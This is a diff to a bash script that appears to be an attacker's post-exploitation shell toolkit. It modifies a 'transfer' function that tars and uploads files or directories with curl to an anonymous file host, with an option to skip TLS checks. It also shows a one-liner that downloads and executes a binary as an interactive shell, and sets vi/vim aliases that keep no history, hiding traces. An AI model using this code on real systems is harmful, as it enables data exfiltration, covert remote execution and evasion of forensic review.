@@ -363,11 +363,14 @@ xorpipe() { xor "${1:-0xfa}" | sed 's/\r/\n/g'; }
 HS_TRANSFER_PROVIDER="oshi.at"
 
 transfer() {
+    local opts=("-SsfL" "--connect-timeout" "7" "--progress-bar" "-T")
+
+    [ -n "$UNSAFE" ] && opts+=("-k")
     [[ $# -eq 0 ]] && { echo -e >&2 "Usage:\n    transfer <file/directory> [remote file name]\n    transfer [name] <FILENAME"; return 255; }
-    [[ ! -t 0 ]] && { curl -SsfL --connect-timeout 7 --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${1}"; return; }
+    [[ ! -t 0 ]] && { curl "${opts[@]}" "-" "https://${HS_TRANSFER_PROVIDER}/${1}"; return; }
     [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
-    [[ -d "$1" ]] && { (cd "${1}/.." && tar cfz - "${1##*/}")|curl -SsfL --connect-timeout 7 --progress-bar -T "-" "https://${HS_TRANSFER_PROVIDER}/${2:-${1##*/}.tar.gz}"; return; }
-    curl -SsfL --connect-timeout 7 --progress-bar -T "$1" "https://${HS_TRANSFER_PROVIDER}/${2:-${1##*/}}"
+    [[ -d "$1" ]] && { (cd "${1}/.." && tar cfz - "${1##*/}")|curl "${opts[@]}" "-" "https://${HS_TRANSFER_PROVIDER}/${2:-${1##*/}.tar.gz}"; return; }
+    curl "${opts[@]}" "$1" "https://${HS_TRANSFER_PROVIDER}/${2:-${1##*/}}"
 }
 
 # SHRED without shred command
@@ -1783,7 +1786,9 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL '$str' && chmod 700 bash && exec ./bash -il"
     [ -z "${HS_PY}" ] && HS_PY="$(command -v python2)"
     HS_PY="${HS_PY##*/}"
 
-    TERM="xterm-256color"
+    unset TERM
+    toe -a 2>/dev/null | grep -qm1 'xterm-256color' && TERM="xterm-256color"
+    [ -z "$TERM" ] && TERM=xterm
 
     HS_ARCH="$(uname -m 2>/dev/null)"
     [ -z "$HS_ARCH" ] && HS_ARCH="x86_64"
@@ -1892,7 +1897,7 @@ hs_init_alias() {
     :
     alias ssh="ssh ${HS_SSH_OPT[*]}"
     alias scp="scp ${HS_SSH_OPT[*]}"
-    alias vi="vi -i NONE"
+    \vi --help 2>&1 | grep -Fqm1 -- -i && alias vi="vi -i NONE"
     alias vim="vim -i NONE"
     alias screen="screen -ln"
 
